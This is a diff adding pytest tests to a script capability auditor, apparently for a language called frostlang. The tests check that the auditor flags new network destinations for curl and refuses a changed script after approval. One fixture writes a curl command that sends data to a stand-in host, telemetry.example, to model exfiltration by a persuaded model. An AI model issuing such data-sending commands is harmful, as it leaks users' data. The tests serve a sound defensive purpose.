@@ -232,3 +232,81 @@ def test_the_approval_and_the_lockfile_answer_different_questions(project):
                            cwd=str(project.root))
     assert frozen == 3, "a content hash should notice any edit"
     assert approved == 0, "the capability set did not change"
+
+
+# ------------------------------------------------------------ destinations
+
+def test_a_new_destination_is_a_widening():
+    """The hole this closes. Recording only program names made
+    `curl https://api.github.com` and `curl https://telemetry.example` the
+    same capability — and a persuaded model does not need a new program, only
+    a new destination."""
+    before = B.capability_set(caps_of(
+        'run "curl" with "https://api.github.com/x" within 30 seconds\n'))
+    after = B.capability_set(caps_of(
+        'run "curl" with "https://api.github.com/x" within 30 seconds\n'
+        'run "curl" with "https://telemetry.example/c" within 30 seconds\n'))
+    assert "it can now reach telemetry.example" in B.widenings(before, after)
+
+
+def test_the_same_host_on_a_different_path_is_not_a_widening():
+    """Otherwise every build number in a URL would churn the baseline, and a
+    baseline that churns is one people re-approve without reading."""
+    before = B.capability_set(caps_of(
+        'run "curl" with "https://api.example/build/1" within 30 seconds\n'))
+    after = B.capability_set(caps_of(
+        'run "curl" with "https://api.example/build/2" within 30 seconds\n'))
+    assert B.widenings(before, after) == []
+
+
+def test_a_host_is_recognised_in_several_shapes():
+    from frostlang.audit import hosts_in, Command
+
+    def command(*args):
+        return Command(program="curl", args=list(args), line=1, checked=True,
+                       timeout=True)
+
+    assert hosts_in(command("https://Api.Example.com/x")) == ["api.example.com"]
+    assert hosts_in(command("http://user:pw@host.example/x")) == ["host.example"]
+    assert hosts_in(command("ssh://git@code.example:22/x")) == ["code.example"]
+    assert hosts_in(command("deploy@shell.example:/srv/app")) == ["shell.example"]
+
+
+def test_a_filename_is_not_mistaken_for_a_host():
+    """Sound rather than clever: a bare `report.example` is indistinguishable
+    from a filename, and inventing hosts in a manifest people are meant to
+    trust is worse than reporting none."""
+    from frostlang.audit import hosts_in, Command
+    c = Command(program="curl", args=["report.example", "-o", "out.txt"],
+                line=1, checked=True, timeout=True)
+    assert hosts_in(c) == []
+
+
+def test_a_network_command_with_no_literal_destination_says_so():
+    """Omitting it would understate, which is the one thing the manifest may
+    never do."""
+    from frostlang.audit import RUNTIME_HOST
+    caps = caps_of('put the standard input into target\n'
+                   'run "curl" with target within 30 seconds\n')
+    assert (RUNTIME_HOST, 2) in caps.reaches
+
+
+def test_a_destination_swap_is_refused_end_to_end(project):
+    project("api.frost",
+            'run "curl" with "https://api.github.com/x" within 30 seconds\n')
+    frost("--approve", "api.frost", cwd=str(project.root))
+    project("api.frost",
+            'run "curl" with "https://api.github.com/x" within 30 seconds\n'
+            'run "curl" with "--data", it, "https://telemetry.example/c" '
+            "within 30 seconds\n")
+    status, _, err = frost("--as-approved", "api.frost", cwd=str(project.root))
+    assert status == 3
+    assert "reach telemetry.example" in err
+
+
+def test_the_manifest_names_the_hosts():
+    from frostlang.audit import describe, summarise
+    caps = caps_of('run "curl" with "https://api.example/x" within 30 seconds\n')
+    assert "Reaches these hosts:" in describe(caps)
+    assert "api.example" in describe(caps)
+    assert "api.example" in summarise(caps)
